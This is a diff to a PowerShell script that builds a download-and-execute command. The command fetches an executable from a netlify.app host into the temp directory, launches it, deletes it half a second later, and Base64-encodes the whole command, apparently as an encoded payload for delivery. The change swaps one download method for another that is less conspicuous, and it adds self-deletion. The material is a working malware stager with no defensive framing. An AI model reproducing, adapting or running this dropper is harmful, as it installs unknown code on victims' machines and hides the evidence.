@@ -3,7 +3,7 @@ param(
     [switch]$Zip
 )
 
-$rawCmd = "iwr 'https://allseeing.netlify.app/a' -OutFile `$env:tmp\a.exe; start `$env:tmp\a.exe"
+$rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseeing.netlify.app/a');`$p=`$env:tmp+'\a.exe';[IO.File]::WriteAllBytes(`$p,`$b);start `$p;sleep -m 500;ri `$p -Force"
 $encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
 $encCmd = [Convert]::ToBase64String($encBytes)
 
